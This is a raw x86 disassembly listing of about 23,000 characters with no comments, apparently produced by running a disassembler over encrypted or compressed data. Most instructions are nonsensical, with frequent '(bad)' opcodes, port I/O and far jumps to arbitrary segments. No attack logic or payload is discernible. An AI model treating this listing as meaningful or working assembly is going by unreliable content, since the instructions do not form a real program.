  419911:	lock mov esp,DWORD PTR es:[ecx-0x5d]
  419916:	test   al,0xce
  419918:	lods   al,BYTE PTR ds:[esi]
  419919:	push   0xfd00b7e7
  41991e:	lock mov BYTE PTR [ecx-0x4914c30c],bl
  419925:	rol    DWORD PTR [eax],0x4
  419928:	jbe    0x41992c
  41992a:	mov    ecx,0x6e5455a5
  41992f:	dec    eax
  419930:	outs   dx,DWORD PTR ds:[esi]
  419931:	fdiv   QWORD PTR [edi]
  419933:	rcr    esp,0x49
  419936:	daa    
  419937:	loopne 0x419931
  419939:	dec    BYTE PTR [esp+ebx*4+0x34eb04da]
  419940:	mov    ebp,0xfdf6d172
  419945:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419946:	or     DWORD PTR [ebp+0x5e],ecx
  419949:	dec    esp
  41994a:	sbb    BYTE PTR [edx],bh
  41994c:	add    BYTE PTR [ebp+0x59da9314],bl
  419952:	cli    
  419953:	xchg   DWORD PTR [edi+eax*2+0xc],eax
  419957:	daa    
  419958:	jg     0x41998c
  41995a:	test   DWORD PTR [esi+0x5e4e9f9c],ecx
  419960:	push   ebp
  419961:	mov    eax,0x228b302d
  419966:	or     eax,0xf21ec15a
  41996b:	inc    esp
  41996c:	mov    al,ds:0x99fcf8a3
  419971:	jmp    0x6e12:0xdc48193d
  419978:	xor    bh,ah
  41997a:	das    
  41997b:	cmp    DWORD PTR [ecx],0x4b
  41997e:	sbb    ch,al
  419980:	(bad)  
  419981:	xchg   ebx,eax
  419982:	mov    edx,0x11fee37d
  419987:	mov    esi,0xee20e95f
  41998c:	dec    ebx
  41998d:	mov    dl,0xd2
  41998f:	mov    edx,0x9f777f19
  419994:	add    eax,0xaa13528c
  419999:	mov    bh,0x22
  41999b:	fwait
  41999c:	gs sbb eax,0xd1494da7
  4199a2:	sbb    ebx,esp
  4199a4:	rcr    DWORD PTR [edx],0x73
  4199a7:	pop    ds
  4199a8:	inc    edi
  4199a9:	fild   DWORD PTR [ebp-0x25]
  4199ac:	sub    edi,0x23713ade
  4199b2:	sbb    ebp,DWORD PTR [eax]
  4199b4:	add    BYTE PTR [edi],cl
  4199b6:	(bad)  
  4199b7:	fsubr  DWORD PTR [esp+edi*8]
  4199ba:	push   esp
  4199bb:	lea    esi,[ebp+0x65d38354]
  4199c1:	(bad)
  4199c4:	shr    DWORD PTR [ebx],0x8f
  4199c7:	mov    ecx,0xee93a72e
  4199cc:	imul   edx,DWORD PTR [eax+0x69d8e152],0xafced894
  4199d6:	jmp    0xbef0:0xe7539a87
  4199dd:	mov    dl,0x6d
  4199df:	adc    eax,0x6984ef75
  4199e4:	adc    esi,DWORD PTR [ebx]
  4199e6:	and    eax,0x180a9a7
  4199eb:	sub    ah,BYTE PTR [esi-0x7ff12401]
  4199f1:	fst    DWORD PTR [eax+0x4e]
  4199f4:	(bad)  
  4199f5:	xchg   ecx,eax
  4199f6:	retf   0x9cef
  4199f9:	mov    cl,0xcb
  4199fb:	in     eax,0x9
  4199fd:	or     al,0x78
  4199ff:	sbb    eax,0x9c1f6ab9
  419a04:	data16 adc bl,BYTE PTR [edx+0x1283e0c7]
  419a0b:	inc    edx
  419a0c:	jns    0x4199c2
  419a0e:	fwait
  419a0f:	icebp  
  419a10:	fild   WORD PTR [ebx]
  419a12:	and    bl,bl
  419a14:	dec    eax
  419a15:	adc    ah,BYTE PTR [ebp-0x1de2aa30]
  419a1b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419a1c:	adc    ecx,edi
  419a1e:	push   edi
  419a1f:	adc    dl,BYTE PTR [esp+ebp*4-0xa]
  419a23:	out    0x4c,eax
  419a25:	mov    edi,0x94d811d1
  419a2a:	or     al,0x3c
  419a2c:	pushf  
  419a2d:	std    
  419a2e:	jp     0x419a22
  419a30:	out    dx,al
  419a31:	out    0xaf,al
  419a33:	ja     0x4199be
  419a35:	pop    ss
  419a36:	mov    dh,0x58
  419a38:	dec    ecx
  419a39:	push   edi
  419a3a:	dec    ecx
  419a3b:	cli    
  419a3c:	out    dx,eax
  419a3d:	jo     0x419a77
  419a3f:	adc    al,0x43
  419a41:	inc    edi
  419a42:	or     BYTE PTR [ecx-0x7c57b4b5],ah
  419a48:	rcr    BYTE PTR [edx+0x3d],cl
  419a4b:	adc    DWORD PTR [esi],0xc2fd8535
  419a51:	mov    edi,DWORD PTR [edx]
  419a53:	add    eax,0x9fe6fa18
  419a58:	or     BYTE PTR [ebp+eiz*1+0x5749ab19],al
  419a5f:	xchg   edx,eax
  419a60:	jnp    0x419aa9
  419a62:	push   edi
  419a63:	lock rcr DWORD PTR [ebp-0x1a353dfb],cl
  419a6a:	int3   
  419a6b:	cld    
  419a6c:	leave  
  419a6d:	sbb    DWORD PTR [ebp-0x32c06d4],ebp
  419a73:	cmp    ecx,DWORD PTR [edx+esi*1+0x26938fd0]
  419a7a:	aad    0x73
  419a7c:	fcmovnb st,st(5)
  419a7e:	je     0x419aa5
  419a80:	sub    bh,BYTE PTR [ebp-0x41]
  419a83:	xchg   ebp,eax
  419a84:	les    eax,FWORD PTR [ebp+edi*4+0x38edf531]
  419a8b:	pop    ds
  419a8c:	ss mov esp,0x89d37ff9
  419a92:	xchg   ebx,eax
  419a93:	shl    DWORD PTR [ebx],1
  419a95:	loop   0x419af3
  419a97:	in     eax,0xe8
  419a99:	cmc    
  419a9a:	push   ds
  419a9b:	push   ebp
  419a9c:	repz pop ds
  419a9e:	fstp   QWORD PTR [ecx]
  419aa0:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  419aa2:	sti    
  419aa3:	popa   
  419aa4:	in     al,0x2a
  419aa6:	mov    bl,0x2a
  419aa8:	pop    esi
  419aa9:	fadd   DWORD PTR [edx-0x7982bf28]
  419aaf:	sbb    ch,cl
  419ab1:	inc    edx
  419ab2:	push   0xd9e34a2d
  419ab7:	add    cl,ch
  419ab9:	stc    
  419aba:	popf   
  419abb:	and    DWORD PTR fs:[edi+0x12],edi
  419abf:	mov    eax,DWORD PTR ds:0xb567
  419ac4:	mov    al,ds:0x35d90ba9
  419ac9:	mov    dl,0xf8
  419acb:	add    BYTE PTR [edx-0x6c],dl
  419ace:	ds js  0x419a6c
  419ad1:	fdivr  QWORD PTR [ecx-0x39a259db]
  419ad7:	and    DWORD PTR [eax],edx
  419ad9:	add    DWORD PTR [ebx-0x446ec415],0xdba23cba
  419ae3:	call   0xb4919814
  419ae8:	daa    
  419ae9:	in     eax,0xa6
  419aeb:	sub    eax,0xbac28d09
  419af0:	sub    al,0xe6
  419af2:	inc    eax
  419af3:	xchg   ebp,eax
  419af4:	jmp    0x2339:0x1b57aaf5
  419afb:	sbb    ah,BYTE PTR [edx-0x3d]
  419afe:	in     al,dx
  419aff:	push   edi
  419b00:	mov    dl,0xc6
  419b02:	das    
  419b03:	inc    esp
  419b04:	add    DWORD PTR [edx-0x389ec3f0],0x1d
  419b0b:	or     eax,0x5863de3c
  419b10:	add    eax,edx
  419b12:	xchg   bl,bl
  419b14:	push   ds
  419b15:	cwde   
  419b16:	dec    eax
  419b17:	mov    ebx,DWORD PTR [edi+0xf]
  419b1a:	xor    ch,BYTE PTR [eax-0x55]
  419b1d:	push   ss
  419b1e:	pop    esi
  419b1f:	in     eax,0x83
  419b21:	mov    dh,0x1d
  419b23:	es (bad) 
  419b26:	mov    ch,0x14
  419b28:	aas    
  419b29:	shl    DWORD PTR [ebx-0x15],0x23
  419b2d:	add    ah,BYTE PTR [eax-0x5d37b4b1]
  419b33:	(bad)  
  419b34:	dec    esi
  419b35:	call   0x1012:0x6c32ab54
  419b3c:	pop    eax
  419b3d:	push   edx
  419b3e:	jne    0x419ada
  419b40:	pusha  
  419b41:	sub    dl,dh
  419b43:	mov    bh,0x63
  419b45:	push   ss
  419b46:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419b47:	scas   al,BYTE PTR es:[edi]
  419b48:	inc    edi
  419b49:	dec    ebx
  419b4a:	pop    edx
  419b4b:	call   0x1c3b:0xf716e555
  419b52:	out    dx,al
  419b53:	adc    eax,0xbe0123db
  419b58:	and    DWORD PTR ds:0xcad9e09d,eax
  419b5e:	xor    DWORD PTR [edx-0x36b547c0],ecx
  419b64:	sub    ah,BYTE PTR [esi-0x26ea89ff]
  419b6a:	mov    eax,0xb1a42261
  419b6f:	mov    ebp,0x1caf4626
  419b74:	mov    bh,0xf7
  419b76:	mov    ds:0x41b4a224,eax
  419b7b:	pop    ss
  419b7c:	out    0x6b,eax
  419b7e:	xchg   edi,eax
  419b7f:	jmp    0x95b0618e
  419b84:	retf   
  419b85:	arpl   WORD PTR [ebx-0x6f],dx
  419b88:	push   DWORD PTR [edi+0x6c]
  419b8b:	rcl    BYTE PTR [edi+0x4c],0x61
  419b8f:	mov    al,ds:0x6c81d30a
  419b94:	ss aaa 
  419b96:	popa   
  419b97:	xchg   esp,eax
  419b98:	pop    ebp
  419b99:	jmp    0x561b:0xe3c55e6d
  419ba0:	add    al,0x5a
  419ba2:	lods   al,BYTE PTR ds:[esi]
  419ba3:	addr16 lock push ss
  419ba6:	jnp    0x419b62
  419ba8:	dec    ecx
  419ba9:	jg     0x419b87
  419bab:	xor    esp,DWORD PTR [ebp+0x33156bbb]
  419bb1:	adc    ecx,eax
  419bb3:	jb     0x419ba3
  419bb5:	outs   dx,BYTE PTR ds:[esi]
  419bb6:	adc    BYTE PTR [ebp-0x16],0x67
  419bba:	iret   
  419bbb:	xor    edi,DWORD PTR [edi+0x5af15da8]
  419bc1:	jle    0x419c2f
  419bc3:	adc    al,0xbd
  419bc5:	sub    BYTE PTR [edx+0x4a],dh
  419bc8:	jne    0x419bf1
  419bca:	adc    edi,DWORD PTR [ebx+eiz*1]
  419bcd:	gs xor ebx,ebp
  419bd0:	mov    ebx,0x7559aafc
  419bd5:	jne    0x419bdb
  419bd7:	test   BYTE PTR [edi+0xb7f67f2],ch
  419bdd:	jne    0x419bac
  419bdf:	fist   DWORD PTR ss:[ebx+0x68d4aa08]
  419be6:	repnz cli 
  419be8:	xor    cl,0x20
  419beb:	pop    ebx
  419bec:	fisub  WORD PTR [edx+ebx*4-0x2068afb8]
  419bf3:	or     al,0xcd
  419bf5:	das    
  419bf6:	pushf  
  419bf7:	push   0xfa931e02
  419bfc:	sub    eax,DWORD PTR [eax-0x3eee8374]
  419c02:	dec    edx
  419c03:	leave  
  419c04:	adc    eax,0x2f8a80b2
  419c09:	push   esi
  419c0a:	hlt    
  419c0b:	sbb    BYTE PTR [eax],dh
  419c0d:	aas    
  419c0e:	sub    bl,BYTE PTR [edi-0x4c]
  419c11:	loop   0x419c45
  419c13:	lock mov ecx,0xa0ce531f
  419c19:	mov    esi,0xbb902d8c
  419c1e:	lahf   
  419c1f:	(bad)  
  419c20:	icebp  
  419c21:	and    dl,BYTE PTR [ebp+0x0]
  419c24:	push   ebx
  419c25:	mov    al,ds:0x65e0c49f
  419c2a:	push   eax
  419c2b:	and    ch,BYTE PTR [ebx-0x5e]
  419c2e:	adc    eax,0x9ad2625a
  419c33:	jecxz  0x419c7e
  419c35:	loopne 0x419c00
  419c37:	pop    ss
  419c38:	jge    0x419be9
  419c3a:	cmp    BYTE PTR [ebx+0x3adf0d1b],0x3
  419c41:	push   0x21
  419c43:	dec    di
  419c45:	popf   
  419c46:	enter  0x3a7c,0xea
  419c4a:	or     DWORD PTR [esi],edx
  419c4c:	dec    ecx
  419c4d:	mov    esi,0xebc23292
  419c52:	or     DWORD PTR [esi*4-0x385ff480],ecx
  419c59:	mov    eax,0xf2ad409e
  419c5e:	pop    ebp
  419c5f:	push   ss
  419c60:	(bad)  
  419c61:	leave  
  419c62:	and    bl,BYTE PTR [edx-0x28b8f6ee]
  419c68:	cwde   
  419c69:	das    
  419c6a:	pop    ds
  419c6b:	(bad)  
  419c6c:	sub    eax,0x93334eb0
  419c71:	jmp    0x419c1b
  419c73:	ja     0x419c2b
  419c75:	cmp    ecx,0x5b
  419c78:	mov    ds:0xef6bffbb,al
  419c7d:	push   ss
  419c7e:	or     al,0xaa
  419c80:	ss push ebp
  419c83:	imul   eax,DWORD PTR [ebx],0xb0834e44
  419c89:	add    eax,0x8c927740
  419c8e:	leave  
  419c8f:	cmp    eax,0x83f4fd02
  419c94:	add    al,0xf3
  419c96:	mov    al,dh
  419c98:	jecxz  0x419c9c
  419c9a:	sar    BYTE PTR [esi-0x34a336d9],cl
  419ca0:	jb     0x419c6b
  419ca2:	rol    BYTE PTR [ebp+0x161d2375],1
  419ca8:	bswap  edx
  419caa:	daa    
  419cab:	cmp    ebx,DWORD PTR [edx+0x311601d8]
  419cb1:	inc    edx
  419cb2:	out    0xa5,al
  419cb4:	repz bound esp,QWORD PTR [eax]
  419cb7:	lock sbb eax,0xc20332f
  419cbd:	pop    ss
  419cbe:	stos   BYTE PTR es:[edi],al
  419cbf:	xor    al,0xd3
  419cc1:	inc    ecx
  419cc2:	or     esp,ecx
  419cc4:	lock mov ds:0x68ab5974,al
  419cca:	fimul  DWORD PTR [esi+edx*4+0x25917860]
  419cd1:	inc    ebp
  419cd2:	arpl   WORD PTR [ebp-0x4b],dx
  419cd5:	dec    ecx
  419cd6:	cmp    ah,BYTE PTR [eax]
  419cd8:	out    0xe5,eax
  419cda:	call   DWORD PTR [ebx-0x56]
  419cdd:	add    BYTE PTR [ecx-0x7d],cl
  419ce0:	cli    
  419ce1:	into   
  419ce2:	cmp    esi,DWORD PTR [esi+0x7d285125]
  419ce8:	call   0xe752:0x6237a019
  419cef:	xor    ch,0x2a
  419cf2:	ret    0x3d53
  419cf5:	sub    eax,0xbb96ae8f
  419cfa:	rcl    DWORD PTR [edi],1
  419cfc:	rcr    BYTE PTR ds:0x43f48102,cl
  419d02:	fcomp  st(7)
  419d04:	xchg   ebp,eax
  419d05:	adc    dh,ah
  419d07:	mov    bl,BYTE PTR [ebp+ebx*2-0x4671a8b6]
  419d0e:	jno    0x419d48
  419d10:	mov    esi,0x2a16bd4b
  419d15:	fbstp  TBYTE PTR [ebx+0x255d5596]
  419d1b:	add    bl,0x6
  419d1e:	data16 or al,0xd3
  419d21:	stc    
  419d22:	popa   
  419d23:	aas    
  419d24:	repz cmp edx,DWORD PTR [ebx-0x7ec28d33]
  419d2b:	inc    esi
  419d2c:	mov    ?,WORD PTR [esi+ebx*1]
  419d2f:	sbb    BYTE PTR [ebx+eiz*8],bh
  419d32:	mov    cs,WORD PTR [ebx-0x68004755]
  419d38:	js     0x419cf8
  419d3a:	aad    0xa2
  419d3c:	pop    eax
  419d3d:	sbb    al,0x84
  419d3f:	add    BYTE PTR [ebx+0x4d11de39],bl
  419d45:	pop    ecx
  419d46:	mov    bl,0xd8
  419d48:	lock mov al,ds:0xad3eb14e
  419d4e:	into   
  419d4f:	fwait
  419d50:	je     0x419d26
  419d52:	inc    edx
  419d53:	or     DWORD PTR [ebp+0xe],eax
  419d56:	repnz gs or al,0x3d
  419d5a:	xor    ebp,edx
  419d5c:	sahf   
  419d5d:	mov    edx,DWORD PTR [edx-0x68]
  419d60:	pop    ss
  419d61:	mov    dh,0x98
  419d63:	aas    
  419d64:	popf   
  419d65:	jmp    0x419da7
  419d67:	push   0xb
  419d69:	lea    edi,[eax-0x29bad864]
  419d6f:	xchg   esp,eax
  419d70:	jg     0x419de8
  419d72:	lds    edi,FWORD PTR [edi-0x2f]
  419d75:	jo     0x419d24
  419d77:	mov    ebx,0x15ae67a5
  419d7c:	mov    bh,0xa5
  419d7e:	ss xor cl,dh
  419d81:	sbb    BYTE PTR [esp+ebx*4-0x169b1b77],bl
  419d88:	xchg   edi,eax
  419d89:	xchg   edx,eax
  419d8a:	push   0xe2bf51cb
  419d8f:	mov    cl,0xa6
  419d91:	adc    al,0x40
  419d94:	xor    al,0x74
  419d96:	adc    al,0xe
  419d98:	cmp    edi,esp
  419d9a:	arpl   WORD PTR [ebp+0x62e828e0],cx
  419da0:	mov    bh,0x6d
  419da2:	mov    cl,bl
  419da4:	pop    ebx
  419da5:	mov    ch,0x67
  419da7:	daa    
  419da8:	(bad)  
  419da9:	pop    edx
  419daa:	mov    ecx,0x7a8fb9c7
  419daf:	sbb    eax,0x96b8b76a
  419db4:	retf   
  419db5:	cmp    esp,DWORD PTR [ebp+0xb]
  419db8:	stos   DWORD PTR es:[edi],eax
  419db9:	push   ss
  419dba:	cmp    esi,DWORD PTR [ebx-0x3d]
  419dbd:	adc    al,0x74
  419dbf:	xchg   BYTE PTR [edi-0x90b748e],al
  419dc5:	int3   
  419dc6:	movq   mm7,QWORD PTR [eax-0x77]
  419dca:	out    0x4c,eax
  419dcc:	test   DWORD PTR [ebx+0x77],eax
  419dcf:	add    al,0x69
  419dd1:	test   ah,bl
  419dd3:	lods   al,BYTE PTR ds:[esi]
  419dd4:	jb     0x419da1
  419dd6:	shl    ebp,0x41
  419dd9:	dec    esp
  419dda:	mov    ch,0x28
  419ddc:	pop    ebx
  419ddd:	add    ah,BYTE PTR [edi-0x74]
  419de0:	jle    0x419dbc
  419de2:	scas   al,BYTE PTR es:[edi]
  419de3:	call   0x9538:0x20398b29
  419dea:	shr    ah,1
  419dec:	les    ebx,FWORD PTR [ecx+0xd]
  419def:	std    
  419df0:	jo     0x419dc2
  419df2:	mov    WORD PTR [ecx],fs
  419df4:	in     al,0x91
  419df6:	or     eax,0xbe7c2d6c
  419dfb:	fsubp  st(1),st
  419dfd:	adc    BYTE PTR [ebp+0x74c15b79],0x66
  419e04:	push   esp
  419e05:	sbb    BYTE PTR [edx],0x9c
  419e08:	es jmp esi
  419e0b:	aaa    
  419e0c:	mov    ebx,0x4567592b
  419e11:	sbb    al,0xda
  419e13:	mov    gs,WORD PTR [edx+0x47]
  419e16:	pusha  
  419e17:	sar    BYTE PTR [edi-0x7181915e],cl
  419e1d:	popa   
  419e1e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419e1f:	dec    edi
  419e20:	xor    eax,0x2f9f0a9f
  419e25:	add    ecx,ebx
  419e27:	fld    TBYTE PTR [edi]
  419e29:	(bad)  
  419e2a:	xchg   ecx,eax
  419e2b:	adc    eax,0xeda6d7b1
  419e30:	out    dx,eax
  419e31:	shl    esi,1
  419e33:	cmc    
  419e34:	pop    esi
  419e35:	dec    ebp
  419e36:	fisttp DWORD PTR [edx]
  419e38:	or     al,0x70
  419e3a:	mov    ds:0x6541a7af,al
  419e3f:	sti    
  419e40:	sbb    bl,BYTE PTR [edx-0x765e7ea]
  419e46:	scas   al,BYTE PTR es:[edi]
  419e47:	adc    BYTE PTR [ebx],al
  419e49:	push   ecx
  419e4a:	(bad)  
  419e4b:	in     al,dx
  419e4c:	test   bh,0x89
  419e4f:	sbb    edi,DWORD PTR [ecx-0x7b590bd5]
  419e55:	fs inc esi
  419e57:	nop
  419e58:	xor    ah,bh
  419e5a:	je     0x419e51
  419e5c:	test   al,0xfd
  419e5e:	push   0x7b
  419e60:	stos   DWORD PTR es:[edi],eax
  419e61:	pop    esi
  419e62:	mov    ch,ah
  419e64:	imul   ecx,DWORD PTR [ebp+0x4d],0x824553d6
  419e6b:	inc    eax
  419e6c:	aam    0x32
  419e6e:	xchg   BYTE PTR [ebp-0x5f],ah
  419e71:	cmp    DWORD PTR [esi],edi
  419e73:	les    edx,FWORD PTR [eax]
  419e75:	repnz std 
  419e77:	fmul   DWORD PTR [edx]
  419e79:	stc    
  419e7a:	cmp    BYTE PTR [edi],dl
  419e7c:	fisttp QWORD PTR [edi-0x56ad69e9]
  419e82:	lahf   
  419e83:	or     BYTE PTR [ebp+0xc45c7bd],ch
  419e89:	jbe    0x419ef0
  419e8b:	fcom   DWORD PTR [eax+0x34]
  419e8e:	fwait
  419e8f:	push   cs
  419e90:	cwde   
  419e91:	jno    0x419ea2
  419e93:	dec    esi
  419e94:	data16 fwait
  419e96:	in     eax,0x26
  419e98:	add    eax,0x984fc005
  419e9d:	xchg   ebp,eax
  419e9e:	push   ss
  419e9f:	push   ebp
  419ea0:	mov    esp,0xb06eb553
  419ea5:	push   ecx
  419ea6:	and    ebp,DWORD PTR [edi-0x75118dce]
  419eac:	in     al,0xdd
  419eae:	cli    
  419eaf:	mov    dl,bh
  419eb1:	dec    ebx
  419eb2:	xchg   ebp,eax
  419eb3:	outs   dx,DWORD PTR ds:[esi]
  419eb4:	ror    BYTE PTR [edx+0x56c9f41e],1
  419eba:	data16 ror BYTE PTR ds:0x8714ff81,0x73
  419ec2:	or     eax,0xe8bc55d3
  419ec7:	lahf   
  419ec8:	xchg   edi,eax
  419ec9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419eca:	dec    ebp
  419ecb:	jg     0x419f19
  419ecd:	push   esp
  419ece:	mov    ecx,0x8e19081b
  419ed3:	mov    bl,0x23
  419ed5:	retf   
  419ed6:	mov    ebx,0xf094f9a1
  419edb:	popa   
  419edc:	idiv   al
  419ede:	adc    DWORD PTR [esi-0x21d01b93],edx
  419ee4:	ins    DWORD PTR es:[edi],dx
  419ee5:	xchg   esp,eax
  419ee6:	fwait
  419ee7:	out    dx,eax
  419ee8:	pop    eax
  419ee9:	mov    ebp,0x7d72afcb
  419eee:	and    al,BYTE PTR [ebp-0x38179ac5]
  419ef4:	pop    edi
  419ef5:	rcr    dl,0xa8
  419ef8:	push   ss
  419ef9:	dec    eax
  419efa:	adc    al,0xa7
  419efc:	mov    BYTE PTR [edi+0x7b],dl
  419eff:	inc    esp
  419f00:	cdq    
  419f01:	shl    dl,cl
  419f03:	cmp    al,0xf4
  419f05:	pop    ss
  419f06:	loopne 0x419ea2
  419f08:	shl    al,1
  419f0a:	(bad)  
  419f0b:	sti    
  419f0c:	ret    0x216
  419f0f:	mov    ds:0x485dc911,eax
  419f14:	rcr    BYTE PTR ds:0x244e2854,0x9b
  419f1b:	add    DWORD PTR ds:0x582148a2,edi
  419f21:	push   ecx
  419f22:	or     eax,0xdf585f38
  419f27:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419f28:	or     al,0x1a
  419f2a:	add    ah,BYTE PTR [edx+ebx*4+0x6d]
  419f2e:	push   cs
  419f2f:	xor    eax,0x3a1e156f
  419f34:	push   esi
  419f35:	sub    al,0x68
  419f37:	std    
  419f38:	out    0x80,al
  419f3a:	push   ebx
  419f3b:	xchg   ebx,eax
  419f3c:	pop    ecx
  419f3d:	xchg   ebx,eax
  419f3e:	int    0xc8
  419f40:	cmc    
  419f41:	mov    dh,0xb5
  419f43:	cmp    edi,DWORD PTR [eax+esi*2-0x2827957e]
  419f4a:	test   BYTE PTR [ebx+0x49],ch
  419f4d:	test   ah,0xa7
  419f50:	jno    0x419f8e
  419f52:	jb     0x419f45
  419f54:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419f55:	stos   DWORD PTR es:[edi],eax
  419f56:	fwait
  419f57:	je     0x419edb
  419f59:	cmp    DWORD PTR [ebx-0x54b52a77],edx
  419f5f:	cmp    DWORD PTR [edi+0x25383552],0x11db056f
  419f69:	push   ebp
  419f6a:	pop    edx
  419f6b:	stc    
  419f6c:	xor    eax,0xe47f91a5
  419f71:	xchg   esp,eax
  419f72:	test   al,0x1e
  419f74:	cld    
  419f75:	repnz xchg edx,eax
  419f77:	pop    edx
  419f78:	push   ss
  419f79:	mov    al,al
  419f7b:	iret   
  419f7c:	jo     0x419f09
  419f7e:	cli    
  419f7f:	push   ecx
  419f80:	repz mov ds:0xf55a9911,al
  419f86:	fstp   QWORD PTR [ecx+esi*8-0x3d88fedd]
  419f8d:	call   0x134d:0xc4049f32
  419f94:	xchg   ecx,eax
  419f95:	mov    edi,edx
  419f97:	fsqrt  
  419f99:	push   0x3d
  419f9b:	into   
  419f9c:	retf   
  419f9d:	das    
  419f9e:	sub    bl,cl
  419fa0:	xchg   edi,eax
  419fa1:	test   al,0xd2
  419fa3:	int    0x4f
  419fa5:	or     dl,BYTE PTR [ebx+0x76124dfa]
  419fab:	jns    0x419fce
  419fad:	mov    esi,0xa45933a9
  419fb2:	pop    esp
  419fb3:	cld    
  419fb4:	cmp    al,0x74
  419fb6:	push   ss
  419fb7:	stc    
  419fb8:	cli    
  419fb9:	mov    ah,0x94
  419fbb:	scas   eax,DWORD PTR es:[edi]
  419fbc:	les    esi,FWORD PTR [eax]
  419fbe:	xchg   BYTE PTR [eax],dh
  419fc0:	popf   
  419fc1:	mov    dl,bl
  419fc3:	push   ebp
  419fc4:	push   edx
  419fc5:	stc    
  419fc6:	test   eax,0x7aa6e72a
  419fcb:	mov    al,0xff
  419fcd:	ret    
  419fce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419fcf:	jle    0x419f5c
  419fd1:	add    DWORD PTR [ebx-0x6f49d260],edi
  419fd7:	je     0x419f69
  419fd9:	xor    bl,BYTE PTR [esi+0x58b3b20d]
  419fdf:	ret    0xda2a
  419fe2:	stos   BYTE PTR es:[edi],al
  419fe3:	mov    ds:0xfe02daa2,eax
  419fe8:	xchg   cx,ax
  419fea:	add    esp,DWORD PTR ds:0x68b7308e
  419ff0:	and    ch,BYTE PTR ds:0x875e3911
  419ff6:	xchg   ebx,eax
  419ff7:	inc    ecx
  419ff8:	mov    es,WORD PTR [ebp-0x32]
  419ffb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419ffc:	std    
  419ffd:	jle    0x419fcf
  419fff:	(bad)  
  41a000:	bound  esi,QWORD PTR [eax]
  41a002:	ret    0xb759
  41a005:	(bad)  
  41a006:	sti    
  41a007:	mov    ah,0xb1
  41a009:	inc    esi
  41a00a:	cmp    DWORD PTR [ecx+0x27b18241],ecx
  41a010:	fdivr  QWORD PTR [ecx-0x636fbdf3]
  41a016:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a017:	push   ebx
  41a018:	dec    eax
  41a019:	adc    ecx,DWORD PTR [edi+0x1a]
  41a01c:	popf   
  41a01d:	sbb    eax,0x75846f5e
  41a022:	(bad)  
  41a023:	fldenv [eax+ebx*8+0x3b3bb9cf]
  41a02a:	rol    ch,cl
  41a02c:	loop   0x419fec
  41a02e:	jmp    0xf8cec7ae
  41a033:	jns    0x41a03f
  41a035:	mov    al,0xc8
  41a037:	push   ds
  41a038:	je     0x41a087
  41a03a:	stc    
  41a03b:	(bad)  
  41a03c:	fisttp WORD PTR [ecx+ebp*8-0x2d]
  41a040:	dec    esi
  41a041:	mov    esi,edi
  41a043:	data16 fist WORD PTR [edi-0x21cbdfe3]
  41a04a:	jns    0x419fcf
  41a04c:	je     0x41a07f
  41a04e:	push   esp
  41a04f:	fcmovbe st,st(3)
  41a051:	int    0x18
  41a053:	daa    
  41a054:	add    DWORD PTR [eax],ebp
  41a056:	xchg   ebp,eax
  41a057:	call   0xd52385b1
  41a05c:	cmp    DWORD PTR [esi],esp
  41a05e:	repnz aad 0xab
  41a061:	aas    
  41a062:	(bad)
  41a065:	or     eax,0xc0620bd7
  41a06a:	xchg   ecx,eax
  41a06b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a06c:	pop    ebx
  41a06d:	mov    dh,0x63
  41a06f:	test   al,0xb7
  41a071:	or     al,0xcd
  41a073:	dec    eax
  41a074:	imul   edi,DWORD PTR [eax],0x979c4fc6
  41a07a:	pop    ecx
  41a07b:	jno    0x41a0c3
  41a07d:	lahf   
  41a07e:	dec    esp
  41a07f:	xor    dl,BYTE PTR [eax]
  41a081:	call   0x562a2825
  41a086:	adc    eax,0x17220304
  41a08b:	push   es
  41a08c:	retf   0xc708
  41a08f:	pop    ecx
  41a090:	dec    esi
  41a091:	and    al,BYTE PTR [edi]
  41a093:	push   ebp
  41a094:	test   DWORD PTR ds:0xb0df8882,eax
  41a09a:	outs   dx,DWORD PTR ds:[esi]
  41a09b:	dec    esp
  41a09c:	test   DWORD PTR [ebx],ecx
  41a09e:	add    eax,0x1fe0f60c
  41a0a3:	jae    0x41a0a4
  41a0a5:	sbb    BYTE PTR [eax],bh
  41a0a7:	enter  0x4708,0x47
  41a0ab:	loopne 0x41a115
  41a0ad:	add    cl,bh
  41a0af:	fyl2x  
  41a0b1:	aaa    
  41a0b2:	retf   0xb174
  41a0b5:	add    dl,dh
  41a0b7:	clc    
  41a0b8:	ins    DWORD PTR es:[edi],dx
  41a0b9:	sar    BYTE PTR [ebp+0x73ff9202],1
  41a0bf:	cs fs (bad) 
  41a0c2:	adc    ch,BYTE PTR [eax-0x759731f6]
  41a0c8:	xchg   ebx,eax
  41a0c9:	mov    dl,0x3d
  41a0cb:	cmp    al,0x67
  41a0cd:	inc    ecx
  41a0ce:	dec    ebx
  41a0cf:	aas    
  41a0d0:	and    BYTE PTR [ebx],bh
  41a0d2:	lods   al,BYTE PTR ds:[esi]
  41a0d3:	enter  0xe8f9,0x2e
  41a0d7:	ror    dl,0x36
  41a0da:	sub    ecx,DWORD PTR [ebp-0x5911a3a9]
  41a0e0:	cmp    DWORD PTR [edi+eax*1-0x8f6f544],ebp
  41a0e7:	mov    edx,0x28aba36f
  41a0ec:	mov    edx,0x88b770b1
  41a0f1:	ins    DWORD PTR es:[edi],dx
  41a0f2:	xor    BYTE PTR [edi-0x3f1deaee],0x1b
  41a0f9:	cmp    DWORD PTR [ecx-0x4f4c088a],ebx
  41a0ff:	cld    
  41a100:	jb     0x41a107
  41a102:	(bad)  
  41a103:	fnsave ss:[edi+eax*1+0x28]
  41a108:	test   al,0xa2
  41a10a:	xor    esi,edi
  41a10c:	add    eax,0x332b7fdd
  41a111:	ss mov esp,0x36a635c4
  41a117:	xchg   ebx,eax
  41a118:	xor    eax,0x2d95d364
  41a11d:	lds    edx,FWORD PTR [ecx+0x56]
  41a120:	test   eax,0xb7ce3ea9
  41a125:	(bad)  
  41a126:	xor    esp,DWORD PTR ds:0x3c8066d1
